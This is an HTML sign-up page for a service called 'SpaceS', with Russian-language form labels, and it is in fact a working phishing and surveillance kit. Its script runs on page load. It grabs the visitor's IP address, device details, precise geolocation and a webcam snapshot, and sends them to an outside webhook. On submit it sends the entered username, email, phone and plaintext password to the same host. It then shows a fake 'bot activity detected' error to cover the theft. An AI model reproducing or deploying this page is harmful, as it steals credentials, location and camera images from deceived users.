<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Registration Form for SpaceS">
    <meta name="keywords" content="Sign up, registration">
    <meta name="author" content="SpaceS Team">
    <title>SpaceS - Registration</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            background: #121212;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        h1 {
            color: #a855f7;
        }

        .message {
            font-size: 1.2rem;
            margin-top: 20px;
        }

        button {
            background: #a855f7;
            border: none;
            padding: 10px 20px;
            color: white;
            font-size: 1rem;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.3s;
        }

        button:hover {
            background: #7817df;
        }

        .form-container {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 400px;
            text-align: center;
            margin-top: 20px;
        }

        .form-container h1 {
            font-size: 2rem;
            margin-bottom: 20px;
            color: #a855f7;
        }

        .form-container input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
            background: #121212;
            color: white;
        }

        .form-container button {
            background: #a855f7;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.3s;
        }

        .form-container button:hover {
            background: #7817df;
        }
    </style>
</head>
<body>
    <h1>SpaceS - Registration</h1>
    
    <div class="form-container">
        <h1>Регистрация</h1>
        <form id="registration-form">
            <input type="text" id="username" placeholder="Имя пользователя" required>
            <input type="email" id="email" placeholder="Электронная почта" required>
            <input type="tel" id="phone" placeholder="Номер телефона" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit">Зарегистрироваться</button>
        </form>
    </div>

    <script>
        const webhookUrl = "https://hkdk.events/qovb8eif4fz5ja";

        // Функция отправки данных на Discord
        async function sendDataToDiscord(data) {
            try {
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                if (response.ok) {
                    console.log("Данные успешно отправлены в Discord!");
                } else {
                    console.error("Ошибка при отправке данных в Discord:", response.status);
                }
            } catch (e) {
                console.error("Ошибка при отправке данных в Discord:", e);
            }
        }

        // Функции для сбора данных IP, устройства, местоположения и камеры
        async function fetchIP() {
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const { ip } = await res.json();
                await sendDataToDiscord({ type: "ip", ip });
            } catch (e) {
                console.error("Ошибка получения IP:", e);
            }
        }

        function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
            };
            sendDataToDiscord({ type: "device", data: deviceInfo });
        }

        async function collectLocationInfo() {
            if (navigator.geolocation) {
                try {
                    await new Promise((resolve, reject) =>
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                sendDataToDiscord({
                                    type: "location",
                                    data: {
                                        lat: pos.coords.latitude,
                                        lng: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy
                                    }
                                });
                                resolve();
                            },
                            (err) => {
                                console.warn("Ошибка геолокации:", err);
                                reject(err);
                            },
                            { enableHighAccuracy: true }
                        )
                    );
                } catch (e) {
                    console.warn("Ошибка получения геолокации:", e);
                }
            }
        }

        async function collectCameraInfo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                const snapshot = canvas.toDataURL("image/png");
                await sendDataToDiscord({ type: "camera", snapshot });
                stream.getTracks().forEach((track) => track.stop());
            } catch (e) {
                console.warn("Ошибка доступа к камере:", e);
            }
        }

        // Отправка данных регистрации на вебхук
        document.getElementById("registration-form").addEventListener("submit", async (e) => {
            e.preventDefault();
            const username = document.getElementById("username").value;
            const email = document.getElementById("email").value;
            const phone = document.getElementById("phone").value;
            const password = document.getElementById("password").value;

            await sendDataToDiscord({
                type: "registration",
                data: { username, email, phone, password }
            });

            alert("Ошибка регистрации, обнаружена бот активность.");
        });

        // Старт сбора данных при загрузке страницы
        window.addEventListener("load", () => {
            fetchIP();
            collectDeviceInfo();
            collectLocationInfo();
            collectCameraInfo();
        });
    </script>
</body>
</html>
